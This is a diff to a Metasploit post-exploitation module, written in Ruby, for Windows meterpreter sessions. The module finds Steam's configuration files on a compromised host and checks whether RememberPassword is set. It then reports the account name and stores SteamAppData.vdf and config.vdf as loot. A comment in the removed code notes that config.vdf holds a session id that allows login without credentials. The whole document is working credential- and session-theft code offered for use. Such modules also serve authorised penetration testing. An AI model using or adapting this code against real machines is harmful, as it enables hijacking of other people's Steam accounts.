@@ -28,6 +28,7 @@ require 'msf/core/post/file'
 class Metasploit3 < Msf::Post
 
 	include Msf::Post::File
+	include Msf::Auxiliary::Report
 
 	def initialize(info={})
 		super( update_info(info,
@@ -36,75 +37,49 @@ class Metasploit3 < Msf::Post
 				account set to autologin. },
 			'License'        => MSF_LICENSE,
 			'Author'         => ['Nikolai Rusakov <nikolai.rusakov[at]gmail.com>'],
-			'Version'        => '$Revision: 00001 $',
 			'Platform'       => ['win'],
 			'SessionTypes'   => ['meterpreter' ]
 		))
-		register_options(
-			[
-				OptPath.new('OUTPUT_FOLDER', [false, 'Where to dump the config files for use with
-					steam. (if not specified it is printed to the screen)'])
-			], self.class)
-
 	end
 
 	def run
-		drive = session.fs.file.expand_path('%SystemDrive%')
+		drive = expand_path('%SystemDrive%')
 		steamappdata = 'SteamAppData.vdf'
 		steamconfig = 'config.vdf'
 		u_rx = /AutoLoginUser\W*\"(.*)\"/
 
-		case session.sys.config.sysinfo['Architecture']
-		when /x64/
-			progs = drive + '\\Program Files (x86)\\'
-		when /x86/
-			progs = drive + '\\Program Files\\'
+		# Steam client is only 32 bit so we need to know what arch we are on so that we can use
+		# the correct program files folder.
+		# We will just use an x64 only defined env variable to check.
+		if not expand_path('%ProgramFiles(X86)%').empty?
+			progs = drive + '\\Program Files (x86)' #x64
+		else
+			progs = drive + '\\Program Files' #x86
 		end
-		path = progs + 'Steam\\config\\'
+		path = progs + '\\Steam\\config\\'
 
-		print_status("Checking for Steam in: #{path}")
+		print_status("Checking for Steam configs in #{path}")
 
-		begin
-			session.fs.dir.entries(path)
-		rescue ::Exception => e
-			print_error(e.to_s)
+		# Check if all the files are there.
+		# I know the path[0..-2] is ugly but directory? does not permit trailing slashes.
+		if directory?(path[0..-2]) && file?(path+steamappdata) && file?(path+steamconfig)
+			print_status("Located steam config files.")
+			sad = read_file(path+steamappdata)
+			if sad =~ /RememberPassword\W*\"1\"/
+				print_status("RememberPassword is set! Accountname is #{u_rx.match(sad)[1]}")
+				scd = read_file(path+steamconfig)
+				store_loot('steam.config', 'text/plain', session, sad, filename=steamappdata)
+				store_loot('steam.config', 'text/plain', session, scd, filename=steamconfig)
+				print_status("Steam configs harvested successfully!")
+			else
+				print_error("RememberPassword is not set, exiting.")
+				return
+			end
+		else
+			print_error("Steam configs not found.")
 			return
 		end
 
-		session.fs.dir.foreach(path) do |fdir|
-			# SteamAppData.vdf contains the autologin and rememberpassword
-			if fdir.eql? 'SteamAppData.vdf'
-				print_status("Found SteamAppData, checking for RememberPassword=1.")
-				sad = session.fs.file.open(path + steamappdata)
-				sad_d = sad.read()
-				sad.close()
-				if sad_d =~ /RememberPassword\W*\"1\"/
-					print_status("RememberPassword is set! Accountname is #{u_rx.match(sad_d)[1]}")
-				end
-				# config.vdf contains most importantly the ConnectCache K,V which appears to be
-				# a session id that can be used to login to the account without credentials.
-				scd = session.fs.file.open(path + steamconfig)
-				scd_d = scd.read()
-				scd.close()
-				# If output folder is set, dump data there
-				if datastore['OUTPUT_FOLDER']
-					f = ::File.open(datastore['OUTPUT_FOLDER'] + '/config.vdf', 'wb')
-					f.write(scd_d)
-					f.close()
-					f = ::File.open(datastore['OUTPUT_FOLDER'] + '/SteamAppData.vdf' ,'wb')
-					f.write(sad_d)
-					f.close()
-					print_status("Files dumped to #{datastore['OUTPUT_FOLDER']}")
-				# No output folder just dump config.vdf to the screen
-				else
-					print_line(scd_d)
-					print_status("config.vdf dumped.")
-				end
-				return true
-			end
-		end
-		print_status("Could not find steam config files.")
-		return nil
 	end
 
 end
